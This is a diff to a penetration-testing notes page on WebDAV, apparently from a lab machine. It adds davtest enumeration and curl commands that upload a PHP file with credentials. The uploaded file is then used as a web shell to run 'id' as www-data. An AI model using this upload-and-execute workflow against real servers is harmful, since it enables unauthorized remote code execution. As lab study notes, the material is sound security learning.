@@ -71,13 +71,27 @@ proxychains nmap -n -sT 127.0.0.1
 _<mark style="color:purple;">**Web Distributed Authoring and Versioning**</mark>_<mark style="color:purple;">, an extension of the</mark> <mark style="color:orange;">**`HTTP`**</mark> <mark style="color:purple;">protocol that allows users to collaboratively edit and manage files stored on a remote server.</mark>
 
 * <mark style="color:purple;">Extends HTTP methods like</mark> <mark style="color:orange;">**`GET`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`POST`**</mark> <mark style="color:purple;">with additional ones like</mark> <mark style="color:orange;">**`PROPFIND`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`PROPPATCH`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`MKCOL`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`DELETE`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`COPY`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`MOVE`**</mark><mark style="color:purple;">, and</mark> <mark style="color:orange;">**`LOCK`**</mark><mark style="color:purple;">.</mark>
-* <mark style="color:purple;">Credentials can be found at</mark> <mark style="color:orange;">**`webdav.passwd`**</mark>
+* <mark style="color:purple;">Credentials can be found at</mark> <mark style="color:orange;">**`webdav.passwd`**</mark><mark style="color:purple;">**.**</mark>
+* [<mark style="color:orange;">**`devtest`**</mark>](https://github.com/cldrn/davtest) <mark style="color:purple;">can be use for enumeration.</mark>
 
 ***
 
-{% code overflow="wrap" %}
+{% code title="Upload files" overflow="wrap" %}
 ```sh
 curl --upload-file ./file.php --user <UserName>:<Password> http://10.10.10.67/webdav_test_inception/
+```
+{% endcode %}
+
+{% code title="Run commands from revshell" overflow="wrap" %}
+```sh
+curl --data-urlencode 'cmd=id' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/file.php
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+{% endcode %}
+
+{% code title="Enumeration" overflow="wrap" %}
+```sh
+davtest.pl -url http://10.10.10.67/webdav_test_inception -auth <UserName>:<Password>
 ```
 {% endcode %}
 {% endhint %}
